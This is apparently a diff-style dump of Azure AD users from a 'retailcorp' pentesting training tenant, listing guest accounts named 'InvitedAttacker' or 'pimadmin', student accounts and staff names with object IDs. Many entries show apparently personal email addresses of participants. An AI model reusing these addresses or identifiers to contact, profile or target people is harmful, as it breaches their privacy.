+pim                    9863e7fa-3376-404a-9588-976acb04a6d6 pimadmin@wambugz.onmicrosoft.com                        pimadmin_wambugz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               350dc0e0-d158-41ab-9c35-41bfda959ec6 pimadmin@wdssa.onmicrosoft.com                          pimadmin_wdssa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               9f2e88d6-dd70-4407-98d5-a05f640cb5df pimadmin@xensito.onmicrosoft.com                        pimadmin_xensito.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+mr PIMadmin            63a72f23-b9ab-4d03-a223-23b624b6052c PIMadmin@zambaxyz.onmicrosoft.com                       PIMadmin_zambaxyz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Inv1_t3d_Attacker1     3e88ca45-5482-418c-ac3d-173352577d26 pimadmin@atkazrpt.onmicrosoft.com                       pimadmin_atkazrpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       2df84159-7feb-4dc5-817c-e661307f1bca pimadmin@azurepentest.onmicrosoft.com                   pimadmin_azurepentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       6d0becf9-16d7-4069-ae1f-f32c3e9606f4 pimadmin@cachupin23.onmicrosoft.com                     pimadmin_cachupin23.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        67538c10-24d8-416f-ae43-de8297ba5d26 pimadmin@kakarot.onmicrosoft.com                        pimadmin_kakarot.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+knt                    837355bd-7871-412e-b697-b5503f26120f pimadmin@kntdwa.onmicrosoft.com                         pimadmin_kntdwa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Yo                     11da2422-e528-40af-b2c0-d60c8ea934ba pimadmin@pentestaznn.com                                pimadmin_pentestaznn.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       31372153-f31a-43ff-a5d7-633a0d39ab1d pimadmin@saneem.onmicrosoft.com                         pimadmin_saneem.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker10      cb905e5b-5687-48a9-8952-436ebab24a68 pimadmin@tnjg4.onmicrosoft.com                          pimadmin_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               a3f6af7e-74eb-426f-929b-404face4a702 pimadmin1@intazatk.onmicrosoft.com                      pimadmin1_intazatk.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimAdminForOperations  a11c914a-28de-4d53-9590-88693fd28541 PimAdminForOperations@proton.me                         PimAdminForOperations_proton.me#EXT#@retailcorp.onmicrosoft.com
+pimadminoperations     7dd9886b-a1d3-45cc-926a-9e8cbbbc5c15 pimadminoperations@heliikopter.onmicrosoft.com          pimadminoperations_heliikopter.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d145eb05-6df8-4c5a-856e-7e5d95074e3e pimadmins@adhackpro.onmicrosoft.com                     pimadmins_adhackpro.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       22f543a0-090c-4f34-a8ac-0d0ac431997e pimajay88@outlook.com                                   pimajay88_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimakattacker          8ff58784-06bf-43ff-bcfd-5b265060afc1 pimakhshay@outlook.com                                  pimakhshay_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       9653e615-168e-457a-9e08-e476482362fb pimaman@outlook.com                                     pimaman_outlook.com#EXT#@retailcorp.onmicrosoft.com
+rahit                  30f26025-8bfc-4ba4-b22a-64ba6026580e pimattackerahi@rahiz.onmicrosoft.com                    pimattackerahi_rahiz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Bob                5b1fc1f2-f429-49d5-a1fd-f00883eafd44 pimbob@benjaminbarneshotmailco.onmicrosoft.com          pimbob_benjaminbarneshotmailco.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Cat                    e3fdc9f8-7ea3-4d9d-8481-47c50b1899a5 pimcat@rayanbouyaicheecole2600.onmicrosoft.com          pimcat_rayanbouyaicheecole2600.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Dev                f00bf173-1897-4a0b-aad8-dfbbb87dc2c8 pimdev@mazuredev.onmicrosoft.com                        pimdev_mazuredev.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                7ce82e95-fade-4556-be10-b5a297ff88d9 pimegranate@khaaao.onmicrosoft.com                      pimegranate_khaaao.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+TestEk                 55da7082-921d-43c7-ab5f-dd0c6d82eebe pimeko@ekotip.onmicrosoft.com                           pimeko_ekotip.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ekotip user            0e2d6053-9856-40fe-a125-145a52ca4ccf PIMEkotip@ekotip.onmicrosoft.com                        PIMEkotip_ekotip.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       72e66a7e-4905-4199-a0b2-b33d6fb39915 pimfghj@outlook.com                                     pimfghj_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Pim Flakito            5af2abc6-b60e-4ab6-8efe-9ef8f04b4e75 pimflakito@testcybertrinchera.onmicrosoft.com           pimflakito_testcybertrinchera.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Guy                338bad95-6bc9-4532-9e2c-98fb4bd20628 pimguy@cyberwox.onmicrosoft.com                         pimguy_cyberwox.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    f32564f3-9b10-4145-8760-b88dcc4d62ec pimi@ilmanu.onmicrosoft.com                             pimi_ilmanu.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+james bond             19522042-90fe-4226-8cab-dd8d4ebb1bee pimjames@empirecorp.onmicrosoft.com                     pimjames_empirecorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker12      4fe33e4d-93a9-4a1b-b87a-6f91697ddfd3 pimlucifer12potter@outlook.com                          pimlucifer12potter_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimretail              33209203-1df4-43c2-af70-e2b8346d9b0a pimmer@acelaboutlook.onmicrosoft.com                    pimmer_acelaboutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    c09c3d85-f18e-4c04-b108-0d1f871468b0 pimmy@funnycorpp.onmicrosoft.com                        pimmy_funnycorpp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM@Rony               76d7575c-d118-4b9b-821c-6cc562a59a21 pimoperationerrony@outlook.com                          pimoperationerrony_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    7be08731-1964-4f3f-9626-315d7ffdf328 pimoperations_yeah_very_original@threemousecorp.onmicr… pimoperations_yeah_very_original_threemousecorp.onmicr#EXT#@retailcorp.onmicrosoft.com
+pimoperations10        c9f2f8ff-cce7-4408-abb6-9a0b425a7d18 pimoperations10@outlook.com                             pimoperations10_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimoperations9         f9255d31-57ce-4b66-b2c1-3d97a745d3bd pimoperations9@gmail.com                                pimoperations9_gmail.com#EXT#@retailcorp.onmicrosoft.com
+Inviteer1              b246f03e-955d-4036-9c8b-6bdf2a25f86d pimoperator@outlook.com                                 pimoperator_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Inviteer1              b854c070-73ed-458e-8892-cfc3ac734d78 pimoperatoroutlook@onmicrosoft.com                      pimoperatoroutlook_onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Inv1_t3d_Attacker1     c74ade83-5999-442e-ac9d-bf5c20045863 pimothypim@outlook.com                                  pimothypim_outlook.com#EXT#@retailcorp.onmicrosoft.com
+stillempty             7950183e-bdcf-4ba7-8b5f-b0005126ebea pimp_dealer@outlook.com                                 pimp_dealer_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerPimp    0bb98aab-2a41-4128-90d5-a115975382dd pimpazlab@gmail.com                                     pimpazlab_gmail.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerPimper  73fec93c-1fdd-41a5-bbb2-d84613ddfae7 pimpazlab@outlook.com                                   pimpazlab_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimpenny               7d30b1f2-81f0-4dcb-b05e-a0e74fb7d11a pimpenny@pennyco2.onmicrosoft.com                       pimpenny_pennyco2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    69a0f2f6-9ab1-4f2d-872a-d2d65c29d152 pimpim@onehaki.onmicrosoft.com                          pimpim_onehaki.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       4154d9da-11cf-468c-9dc5-fe1a1e1af3e0 pimpimoperation@gmail.com                               pimpimoperation_gmail.com#EXT#@retailcorp.onmicrosoft.com
+User Two               e34e6fbb-621c-4ec6-97b0-005ae8467908 pimpimpim@exandroiddev.onmicrosoft.com                  pimpimpim_exandroiddev.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    8c27d2c1-1f87-467f-8456-eef7fbf8c7a0 pimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpim@ou… pimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpim_o1#EXT#@retailcorp.onmicrosoft.com
+Pim                    582a611a-472f-4fae-81e7-7815072ba0dd pimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpim@ou… pimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpimpim_ou#EXT#@retailcorp.onmicrosoft.com
+Pimpinela              300a59f4-0feb-4cfc-a5b3-013a76029c4c pimpinela@learningpentestazuread.onmicrosoft.com        pimpinela_learningpentestazuread.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimPmeister            1e8b4742-4a75-430a-a1ac-aab63d189095 pimpmaster@sekretingaling.onmicrosoft.com               pimpmaster_sekretingaling.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+ping pong              b0766488-994e-4621-9adf-d7f79f440ec9 pimpong@heroesIII.onmicrosoft.com                       pimpong_heroesIII.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pratik                 483c9af4-5a5f-4710-8d5a-4aff7a2139da pimpratik@hotmail.com                                   pimpratik_hotmail.com#EXT#@retailcorp.onmicrosoft.com
+PIM15                  9ca2b8b9-1dc4-4115-9f0c-9935eaf442d7 PIMprueba@dominioprueba27.onmicrosoft.com               PIMprueba_dominioprueba27.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       8710369a-9127-4cec-aa7b-523149bbc44b pimrez@outlook.com                                      pimrez_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e1d70cdf-6e39-4702-9f9a-c9b1386f4c2b pimsaajan@outlook.com                                   pimsaajan_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimsadmin              ff6043b9-b9f2-4e0b-b466-ea963db07280 pimsadmin@mrzahidniazihotmail.onmicrosoft.com           pimsadmin_mrzahidniazihotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimtest                1c462c17-d36a-44ae-9a64-4ddeb97abcb5 pimtest@bugtester69.onmicrosoft.com                     pimtest_bugtester69.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Test               36876e3b-f920-4434-87a5-3e34561974a4 pimtest@marcingrzesiakdev.onmicrosoft.com               pimtest_marcingrzesiakdev.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimtest                62c3fcbc-be7c-4e38-ae9a-2792f625acb3 pimtest@outlook.fr                                      pimtest_outlook.fr#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       b0a873a3-5341-4d3c-89f4-9cb7c5a0caf0 pimtest2022@outlook.com                                 pimtest2022_outlook.com#EXT#@retailcorp.onmicrosoft.com
+MRS_Attacker           c18a6855-d8c9-4548-a479-66581a45d9df pimtester@outlook.com                                   pimtester_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimtester123123        f57a0a23-b55f-4f30-a126-a52c84fb5fca pimtester123123@tsukinft.club                           pimtester123123_tsukinft.club#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker        159eb66f-4243-4406-8615-f1ff63855e17 pimtestpim@outlook.com                                  pimtestpim_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimtestuser            2d28b818-e4e5-4b55-bc28-e74d444ef6e7 pimtestuser@inboxjnb.onmicrosoft.com                    pimtestuser_inboxjnb.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerXYZ123  a7214e8b-7c7c-4756-8b8b-cd980798b0df pimtestuser@azureintrocourse.onmicrosoft.com            pimtestuser_azureintrocourse.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimuser                34c29c4f-ebb3-4220-8598-37c22b76284b pimuser@cybersek.onmicrosoft.com                        pimuser_cybersek.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                28183be7-728b-4f8a-9d32-c6b3e4ddc655 PIMuser@pimuser.onmicrosoft.com                         PIMuser_pimuser.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim user               8bc2f216-019a-4034-b415-efd4c28d7610 pimuser@redteamattacks.com                              pimuser_redteamattacks.com#EXT#@retailcorp.onmicrosoft.com
+PIMUser                fdb11777-8ac2-4212-ac39-61fef9a8464a                                                         PIMUser@retailcorp.onmicrosoft.com
+pimuser                3003f212-dac0-4596-8b59-eb04e1d1b1c2 pimuser@aishwarya21learngmail.onmicrosoft.com           pimuser_aishwarya21learngmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+AntonProb              6ef92c11-7c91-4b28-93ef-8b58a9009bf3 pimuser_antoniocm@outlook.com                           pimuser_antoniocm_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pimuser                72398121-bb25-4807-9c30-4174425179ff pimuser@azurettesting12345.onmicrosoft.com              pimuser_azurettesting12345.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimUser 01             ef60c2de-2f12-41ec-8f65-e1d4873dbee3 pimUser01@nullmint.onmicrosoft.com                      pimUser01_nullmint.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimuser01              e336b561-4b56-43bc-80af-77f615213198 pimuser01@quesohut2000.onmicrosoft.com                  pimuser01_quesohut2000.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM User               bab9af6a-4e6c-40c1-a2fd-ef68aa7f3faf pimuser02@adpentest.onmicrosoft.com                     pimuser02_adpentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimuser                bd038423-f7c8-4a87-8991-d7fd12b26a94 pimuser1@hybridlabdomain.onmicrosoft.com                pimuser1_hybridlabdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimuser                29c052f9-7a22-4aec-9060-7a2da21c525b pimuser1@sawndemo.onmicrosoft.com                       pimuser1_sawndemo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1998    dd188e06-7fa4-41b3-8243-702da9fa9c7e pimuser2025@outlook.com                                 pimuser2025_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker412     cc928adb-6a39-4e7e-847e-bb386a5fc7d6 pimusertest@typenuke.onmicrosoft.com                    pimusertest_typenuke.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a1b0e5b7-5ecf-4c31-bcd9-3dbdfebf8d97 pimusr235@outlook.com                                   pimusr235_outlook.com#EXT#@retailcorp.onmicrosoft.com
+pim mip                f81b71c1-c3c6-40e1-b402-51d4971c42aa pimw33vils@w33vils.onmicrosoft.com                      pimw33vils_w33vils.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Hackertoy              dc5f0002-be01-49e1-bd40-e04deaebf550 pimxensito@xensito.onmicrosoft.com                      pimxensito_xensito.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       bb431f8f-5034-452e-a427-3f9c30e2cf09 pin@infosecrick.onmicrosoft.com                         pin_infosecrick.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pioperation            16101bd0-549f-49cf-8615-0d36712006bf pioperation@ffsazpt.onmicrosoft.com                     pioperation_ffsazpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim-demo               04401b3a-d7e9-49d9-be66-b56121b4120b pm@vishalrajinfosecprogmail.onmicrosoft.com             pm_vishalrajinfosecprogmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       2ed5da2e-2db4-423a-a990-0bd64505e4bd prashantgaurav9099@outlook.com                          prashantgaurav9099_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Pimadmin               a23ad9ad-fae4-48ea-a5da-5f7a3531bca5 premkumarmadiwal@gmail.com                              premkumarmadiwal_gmail.com#EXT#@retailcorp.onmicrosoft.com
+pwned pwned            6f7b961b-63d0-4ddc-a482-fbaac7a72ec5 pwned@hakapelita7gmail.onmicrosoft.com                  pwned_hakapelita7gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       044b0c28-78e4-4d6a-b877-c1c55611b567 QurtiDevs@outlook.com                                   QurtiDevs_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Rachel R Barnes        8646776e-e614-4a26-8220-7874c0875446                                                         RachelRBarnes@retailcorp.onmicrosoft.com
+InvitedAttacker1       1ee6998d-ecb0-4c97-9424-a1561fff415b rahulpimprajapat@outlook.com                            rahulpimprajapat_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Raj Humy               4e3e6b3c-47ec-452c-a9bf-885b1adba93e rajhumy@gmail.com                                       rajhumy_gmail.com#EXT#@retailcorp.onmicrosoft.com
+redAttacker1           0a6de5fa-6aff-4af5-a3ca-3e67b1493238 redteamlab@outlook.fr                                   redteamlab_outlook.fr#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       f3aadb1c-cdd7-4d07-b1f7-4e69c618a9b5 redteamlab@outlook.com                                  redteamlab_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Ret2pwn                64aa9c84-86d8-4142-b461-de446d00bb7f Ret2pwn@verycute.onmicrosoft.com                        Ret2pwn_verycute.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Retail Admin           b218182b-ef67-4fd0-b47b-0b3705398042                                                         retailadmin@retailcorp.onmicrosoft.com
+rezthebez              5be46e25-9f09-4f23-89b9-9d541cee1a3d rezpim@outlook.com                                      rezpim_outlook.com#EXT#@retailcorp.onmicrosoft.com
+Rich A Bonner          4483ec37-5eaf-49d4-8a09-b8eb1bbe2c12                                                         RichABonner@retailcorp.onmicrosoft.com
+Richard C Ferguson     a26497ef-7f74-404f-b6c9-7ad264b062e3                                                         RichardCFerguson@retailcorp.onmicrosoft.com
+Richard E Eberhard     94a779e8-0d6f-46fc-a599-a303e42719b4                                                         RichardEEberhard@retailcorp.onmicrosoft.com
+Robert A Wallick       43a25508-e508-4c69-9ae3-e9a386b299fc                                                         RobertAWallick@retailcorp.onmicrosoft.com
+Robert H Spradlin      980e58a4-62d6-40d0-9b48-398915b7dddc                                                         RobertHSpradlin@retailcorp.onmicrosoft.com
+Robert K Harrod        4986174a-943e-42d0-ba24-7d25e2902721                                                         RobertKHarrod@retailcorp.onmicrosoft.com
+Robert M Willis        658a0e16-87d1-45d9-a015-044ee65bcdd0                                                         RobertMWillis@retailcorp.onmicrosoft.com
+Robin C McAndrew       6a6e15f4-b58f-42bd-ab70-14a0a950e70f                                                         RobinCMcAndrew@retailcorp.onmicrosoft.com
+Rodney K Mangum        89bc9bc0-8872-437a-9ae4-e6c01eb19f61                                                         RodneyKMangum@retailcorp.onmicrosoft.com
+Roger D Brown          3de560f6-01c4-40ef-adfb-1d5b64660215                                                         RogerDBrown@retailcorp.onmicrosoft.com
+Ronald R Perry         8b8d9778-43a6-409c-a76e-c435d2fb6c27                                                         RonaldRPerry@retailcorp.onmicrosoft.com
+InvitedAttacker1       00f4126d-2353-4166-84eb-7903839e6ffe rony@er.rony007.onmicrosoft.com                         rony_er.rony007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Rosie K Donaldson      fc70819b-ce29-462a-9c90-b0a6841455d6                                                         RosieKDonaldson@retailcorp.onmicrosoft.com
+R Tester               c8c77ea1-3b08-4665-b50e-90f3bdfa0d2b rtester@rtester.onmicrosoft.com                         rtester_rtester.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       e055a435-69b6-4725-8df3-bb9a52c57e58 rue@gobrien644210outlook.onmicrosoft.com                rue_gobrien644210outlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Ruth D Rader           f8d5ec54-eec9-4883-8948-0cd6e0f74a7d                                                         RuthDRader@retailcorp.onmicrosoft.com
+Sadie L Thompson       d5afd4c5-9a6a-4de0-85e9-eddad9c21ef0                                                         SadieLThompson@retailcorp.onmicrosoft.com
+Sample User            2e2a1aee-41fc-4e53-8b33-bb30e6f242e4 pim@hermh4cks.onmicrosoft.com                           pim_hermh4cks.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Sandra J Waldrop       4d3b89f5-1115-4d7f-a1c3-7e2fed321a9c                                                         SandraJWaldrop@retailcorp.onmicrosoft.com
+Sandra T Roman         a7fa6de5-4736-4587-9681-765280966dfb                                                         SandraTRoman@retailcorp.onmicrosoft.com
+InvitedAttacker1       9e8f1514-5792-4846-95d0-10439af6be5a saneem@saneem.onmicrosoft.com                           saneem_saneem.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Sara A Kendrick        5b20a74e-59e6-406c-94ad-a9069c1a50c0                                                         SaraAKendrick@retailcorp.onmicrosoft.com
+Sebastian M Carroll    69e03c2a-0f2a-4573-8737-7daf02e2018c                                                         SebastianMCarroll@retailcorp.onmicrosoft.com
+FNU LNU                ed00d022-a76b-449a-b417-ec5d46687f64 securitybest99@unjob.onmicrosoft.com                    securitybest99_unjob.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Selena D Pelzer        621aadbe-d1f7-4d68-8b08-27d881307c38                                                         SelenaDPelzer@retailcorp.onmicrosoft.com
+Shane A Russell        17d40ba9-478d-463e-ba2a-df3e8562cadc                                                         ShaneARussell@retailcorp.onmicrosoft.com
+Sharron A Russell      c141d1c0-632f-4b0d-a556-5022a72822ce                                                         SharronARussell@retailcorp.onmicrosoft.com
+Sherri W Brown         b2aa0181-02c5-477a-9cf6-8e27a5da4c5f                                                         SherriWBrown@retailcorp.onmicrosoft.com
+InvitedAttacker1       097b359e-4737-4d9a-96cb-c5e12421a7cf shinkami1@outlook.es                                    shinkami1_outlook.es#EXT#@retailcorp.onmicrosoft.com
+Shinkami               0f15aca1-6778-4b1c-9ada-19ba72923590 shinkami1@outlook.com                                   shinkami1_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       a89ef9a4-acb7-4983-a00b-e54bc7407788 shiva8944@shiva8944.onmicrosoft.com.onmicrosoft.com     shiva8944_shiva8944.onmicrosoft.com.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Slayer Pim             e99550ca-8443-42a6-b3c0-a76efbf862b0 slayerpim@sundeelis.onmicrosoft.com                     slayerpim_sundeelis.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Slime                  6743090d-cfdf-457c-a6f1-e7d115fdb96c slime@acelaboutlook.onmicrosoft.com                     slime_acelaboutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pentesting             2935a47b-4798-479d-91c0-faa5aeff8e36 soc@3arh.onmicrosoft.com                                soc_3arh.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Stephanie R George     241d047c-bea6-41de-9060-f34aa2844fff                                                         StephanieRGeorge@retailcorp.onmicrosoft.com
+Stephen E Higgins      d3e585a4-a0e1-4adb-b5f2-5df000a43c39                                                         StephenEHiggins@retailcorp.onmicrosoft.com
+Stephen L Williams     37592784-4083-4512-a2f2-723217fd7b77                                                         StephenLWilliams@retailcorp.onmicrosoft.com
+Stephen M Dover        ee3ffc2e-7692-4234-b4c8-89b15ef724f1                                                         StephenMDover@retailcorp.onmicrosoft.com
+Steven B Anderson      5aca5939-2ed2-45be-bc20-5317007d0915                                                         StevenBAnderson@retailcorp.onmicrosoft.com
+Steven L Calloway      3ce50c16-c1e2-4d22-990d-69a88eb7cb45                                                         StevenLCalloway@retailcorp.onmicrosoft.com
+Steven P Zellmer       a2724b7c-6f74-459f-ab91-8dc1ae916dc4                                                         StevenPZellmer@retailcorp.onmicrosoft.com
+student1               afcc520d-3696-4c9c-9aae-0de15aacefc9                                                         student1@retailcorp.onmicrosoft.com
+student10              86dc415a-2d7f-4d31-9a9d-1d45ae6b644b                                                         student10@retailcorp.onmicrosoft.com
+student11              2637b6f0-ba52-4c21-a8d9-18dc0f9ede23                                                         student11@retailcorp.onmicrosoft.com
+student12              fed4b6d0-67e1-4a94-8f3a-cc0a8c4c65b0                                                         student12@retailcorp.onmicrosoft.com
+student13              35805f31-06e5-44f6-ad58-c300ada9dcb7                                                         student13@retailcorp.onmicrosoft.com
+student14              09f1e502-bf11-449e-b6f5-9906892ee526                                                         student14@retailcorp.onmicrosoft.com
+Student147             5908e977-623c-48f3-a7f9-1849041c6ba9 Student147@nomoreoil.onmicrosoft.com                    Student147_nomoreoil.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+student15              8e28e37d-1a86-4d0f-bc9d-65687f5ec8dd                                                         student15@retailcorp.onmicrosoft.com
+student16              f91cbb0f-5f6b-45c7-9408-0161a1146536                                                         student16@retailcorp.onmicrosoft.com
+student17              b71f66cd-df93-4ea6-99f5-afe99fe3ad72                                                         student17@retailcorp.onmicrosoft.com
+student18              a260cd81-1e99-46f9-b30f-b7699718e4d8                                                         student18@retailcorp.onmicrosoft.com
+student19              57133184-8035-463c-b249-8f685e1df1a3                                                         student19@retailcorp.onmicrosoft.com
+student2               339dc420-26de-46ad-b14d-db6f973095bc                                                         student2@retailcorp.onmicrosoft.com
+student20              e51bcc00-75e8-4e4e-a6a3-730f8f927ab9                                                         student20@retailcorp.onmicrosoft.com
+student21              7713b100-c449-42d1-b386-dc226bb0a1c7                                                         student21@retailcorp.onmicrosoft.com
+student22              0cfca80a-519b-4f54-8bb8-3aab207e5af1                                                         student22@retailcorp.onmicrosoft.com
+student23              4be65ba1-4c72-40f4-919c-117183b4ef46                                                         student23@retailcorp.onmicrosoft.com
+student24              6db2589d-7157-46f6-a9b7-2421fd3553bd                                                         student24@retailcorp.onmicrosoft.com
+student25              76df55f4-40cd-47f1-a799-fba526d7822a                                                         student25@retailcorp.onmicrosoft.com
+Student3               4dd7a113-6a37-4c09-a0a0-c95b05df4709                                                         student3@retailcorp.onmicrosoft.com
+student4               854b1cad-ef49-452e-bf03-4d55843682e6                                                         student4@retailcorp.onmicrosoft.com
+student5               01046e05-e09d-41fb-a0bb-7dfb5d0b430c                                                         student5@retailcorp.onmicrosoft.com
+student6               bd29f06d-c77e-46b3-a27c-dff23c2136c7                                                         student6@retailcorp.onmicrosoft.com
+student7               88331945-e0d6-4aa8-8550-878a13545b27                                                         student7@retailcorp.onmicrosoft.com
+student8               346a8614-6728-48c4-88bf-9872c06a2013                                                         student8@retailcorp.onmicrosoft.com
+student9               d454ffa0-718d-43ce-8a2c-b092880abdb3                                                         student9@retailcorp.onmicrosoft.com
+Sue M Wallace          d9ea01d8-b92e-4135-b5c6-153ddddf938a                                                         SueMWallace@retailcorp.onmicrosoft.com
+Susanna J Jarrell      97e2d49d-3f85-49f7-95dc-5abc5d6f9642                                                         SusannaJJarrell@retailcorp.onmicrosoft.com
+Susanne L Spencer      bbc428ec-e4bd-4c35-a701-c31bf88d3644                                                         SusanneLSpencer@retailcorp.onmicrosoft.com
+swami                  4de15b20-c56e-4957-bef3-7c29365114fe swami@abhi52hotmail.onmicrosoft.com                     swami_abhi52hotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Tanner J Starling      15a0b99f-613c-447a-a6ac-11987e7ab731                                                         TannerJStarling@retailcorp.onmicrosoft.com
+Tanya S Garza          05ca5646-f235-4908-98a1-581105b96187                                                         TanyaSGarza@retailcorp.onmicrosoft.com
+Ted L Bachman          2c6c7c84-fe91-4d1d-9c20-6f7113a2742a                                                         TedLBachman@retailcorp.onmicrosoft.com
+Teresa B Standridge    187e119d-ff14-4e9d-aa9d-818a67e02649                                                         TeresaBStandridge@retailcorp.onmicrosoft.com
+Teresa M Seybert       cbb05ce3-b86c-438b-897d-849b8d292c98                                                         TeresaMSeybert@retailcorp.onmicrosoft.com
+Terrell S Slusher      c19f8265-0e04-4fc0-9adb-d69e12b2ac52                                                         TerrellSSlusher@retailcorp.onmicrosoft.com
+test                   9d7de35a-9d32-47b9-a7c3-3cedab15e66b test@amansahni2000gmail.onmicrosoft.com                 test_amansahni2000gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+test user              033cfee6-d2ea-4e6f-8195-26efab76c888 test@shipha.onmicrosoft.com                             test_shipha.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+q1                     f3b5ef78-e877-4d7c-af65-cec067166acb test@skullcrushers123.onmicrosoft.com                   test_skullcrushers123.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+WhiteDevil             93572706-cd8a-4744-9bac-2749974852d6 test@adpentest.onmicrosoft.com                          test_adpentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
